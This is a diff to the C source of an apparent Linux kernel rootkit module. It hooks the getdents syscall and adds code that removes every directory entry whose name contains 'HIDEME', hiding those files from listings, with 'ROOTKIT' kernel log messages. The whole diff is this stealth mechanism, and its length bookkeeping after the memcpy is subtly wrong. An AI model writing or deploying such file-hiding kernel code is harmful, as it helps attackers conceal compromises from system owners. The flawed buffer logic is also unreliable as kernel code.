@@ -3,7 +3,9 @@
 #include <linux/kallsyms.h>
 #include <linux/unistd.h> // __NR_syscall
 #include <linux/version.h> // LINUX_VERSION_CODE
+#include <linux/string.h>
 #include <asm/paravirt.h> // write_cr0
+
 
 #include "helper.h"
 
@@ -40,31 +42,26 @@ asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *d
 
 #endif
 
-
 unsigned long *syscall_table = NULL;
 
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count, long ret) {
+	int buff_offset, suma;
+	struct linux_dirent* currnt;
+	printk(KERN_INFO "ROOTKIT: sysgetdents init\n");
 
-	/*if (dirent != 0)
-		//printk(KERN_INFO "ROOTKIT: sys_getdents: Fd: %u. Count: %u. Ino: %lx. Off: %lx. Reclen: %hx. Name: %s\n", oldfd, count, dirent->d_ino, dirent->d_off, dirent->d_reclen, dirent->d_name);
-		printk(KERN_INFO "ROOTKIT: sys_getdents: Fd: %x. Possible fd: %lx\n", fd, possible_fd);
-	else
-		printk(KERN_INFO "ROOTKIT: sys_getdents null dirent!?!?!?!\n");*/
-
-	/*int n, buff_offset;
-	struct linux_dirent* actual;
-
-	n = 0;
 	buff_offset = 0;
-	actual = dirent;
-	while (buff_offset < 1){
-		printk(KERN_INFO "ROOTKIT sys_getdents we're at offset %d\n", buff_offset);
-		buff_offset + actual->d_off;
-		actual = (struct linux_dirent*)((char*)actual + actual->d_off); //casting needed for increasing exactly d_off bytes
-		n++;
+	currnt = dirent;
+	while (buff_offset < ret){
+		currnt = (struct linux_dirent*)((char*)dirent + buff_offset);
+		if (strstr(currnt->d_name, "HIDEME") != NULL){
+			printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
+			// Copies the rest of the buffer to the position of the current entry
+			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
+			ret -= currnt->d_reclen;
+		} else
+			buff_offset += currnt->d_reclen;
 	}
-	printk(KERN_INFO "ROOTKIT sysgetdents read %d entries!", n);*/
-	printk(KERN_INFO "ROOTKIT: Hello from sys_getdents %d\n", count);
+	printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
 	return ret;
 }
 
